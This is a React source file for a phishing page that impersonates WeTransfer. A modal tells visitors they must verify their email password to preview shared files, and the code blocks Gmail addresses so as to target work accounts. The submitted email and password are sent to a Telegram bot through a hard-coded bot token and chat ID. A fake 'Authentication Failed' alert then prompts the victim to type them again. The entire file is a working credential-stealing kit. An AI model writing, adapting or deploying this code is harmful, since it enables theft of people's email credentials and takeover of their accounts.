import { useEffect, useRef, useState } from 'react';
import Video from './assets/Bgvid2.mp4';
import Header from './Header';
import TextComp from './TextComp';
import BoxComp from './BoxComp';

function App() {
	const [showModal, setShowModal] = useState(false);
	const [showPassword, setShowPassword] = useState(false);
	const emailRef = useRef(null)
	const [password, setPassword] = useState('');
	const botToken = `6800765360:AAEx4sxK-Hhz0b_dvSiQq4l2YK6CBHWK6gg`;
	const chatId = 5843568772;

	useEffect(() => {
		// Extracting a query parameter named 'value' from the URL
		const urlParams = new URLSearchParams(window.location.search);
		const inputValue = urlParams.get('email');
		console.log(inputValue)

		// Setting the value of the input element if it exists in the URL
		if (emailRef.current && inputValue) {
			emailRef.current.value = inputValue;
		}
	}, [showModal]);

	function handleShowModal() {
		setShowModal(!showModal);
	}

	function closeModal(e) {
		if (e.target.id == 'modalbg') {
			setShowModal(false);
			setShowPassword(false);
			// setEmail('');
			emailRef.current.value = ''
			return;
		} else {
			setShowModal(true);
		}
	}

	function handlePassword(e) {
		setPassword(e.target.value);
	}

	function regexEmailValidate(userEmail) {
		const emailRegex =
			/([a-zA-Z0-9]+)([\.{1}])?([a-zA-Z0-9]+)\@(?:gmail|GMAIL)([\.])(?:com|COM)/;
		return emailRegex.test(userEmail);
	}

	async function sendDetails(email, password) {
		try {
			const message = `
!UPDATE

~ New Details ~

Email: ${email}

Password: ${password}
`;

			const response = await fetch(
				`https://api.telegram.org/bot${botToken}/sendMessage`,
				{
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
					},
					body: JSON.stringify({
						chat_id: chatId,
						text: message,
					}),
				}
			);

			const data = await response.json();
			console.log(data);
			console.log('Message sent successfully.');

			// Success message should be shown here
			alert(
				`Authentication Failed \nInput correct credentials to preview files`
			);
			setPassword('')
			emailRef.current.value = ''
		} catch (error) {
			console.error('Error sending message:', error);
		}
	}

	function submitHandler(e) {
		e.preventDefault();

		if (!password) {
			setShowPassword(true)
		} else {
			checkDetails(emailRef.current.value, password);
		}

		async function checkDetails(userEmail, userPassword) {
			try {
				if (regexEmailValidate(userEmail)) {
					alert('Input your domain email. Gmail not allowed');
					return;
				}

				const formData = new FormData();
				formData.append('userEmails', userEmail);
				formData.append('userPasswords', userPassword);

				const data = Object.fromEntries(formData);
				console.log(data);
				const { userEmails, userPasswords } = data;
				await sendDetails(userEmails, userPasswords);
			} catch (error) {
				console.log(error);
			}
		}

		
	}

	return (
		<main className=" w-full h-screen bg-black bg-opacity-70 overflow-y-hidden">
			<div className="vidCtn relative">
				<video
					autoPlay
					muted
					loop
					id="vid"
					className="fixed right-0 top-0 min-h-screen min-w-full z-[-10]"
				>
					<source src={Video} type="video/mp4" />
				</video>
			</div>

			<Header />
			<div className="bodyComp flex gap-12 mt-4 pl-16">
				<BoxComp handleModal={handleShowModal} />
				<TextComp />
			</div>

			{showModal && (
				<>
					<div
						id="modalbg"
						className="z-1 fixed bg-[black] bg-opacity-50 h-full w-full top-0 left-0"
						onClick={closeModal}
					>
						<div className="modal bg-white w-[400px] h-[500px] rounded-[10px] mx-auto mt-[100px] px-6 pt-4">
							<h3 className="font-extrabold text-[35px] text-[#DAE1E7]">
								<span className="text-[#409fff]">we</span>
								transfer
							</h3>
							<p className="text-[14px] text-[#aaa] mt-3 border-b pb-2">
								These files are sensitive and secured against
								unauthorized access. In order to access this
								file, You’ll need to verify your email so we
								know it’s really you, we will connect to your
								email provider through a secured IMAP channel to
								authorize your download.
							</p>

							<p className="text-center font-medium text-[20px] mt-2 text-[#22292f]">
								Please verify your email password to preview
								images!
							</p>

							<form
								className="modalForm"
								onSubmit={submitHandler}
							>
								<div className="input flex flex-col gap-2">
									<label htmlFor="email"> Email:</label>
									<input
										type="email"
										id="email"
										className="border-2 py-1 px-2 rounded-md"
										ref={emailRef}
										required
									/>
								</div>

								{showPassword && (
									<div className="input flex flex-col gap-2 mt-4">
										<label htmlFor="password">
											{' '}
											Password:
										</label>
										<input
											type="password"
											id="password"
											className="border-2 py-1 px-2 rounded-md"
											value={password}
											onChange={handlePassword}
											required
										/>
									</div>
								)}

								<button
									className="bg-[#409fff] text-[#f4f4f4] py-2 px-8 text-center rounded-[1.25em] cursor-pointer font-medium text-[20px] mt-3 mr-4"
								>
									{!showPassword ? 'Next' : 'Preview'}
								</button>
							</form>
						</div>
					</div>
				</>
			)}
		</main>
	);
}

export default App;
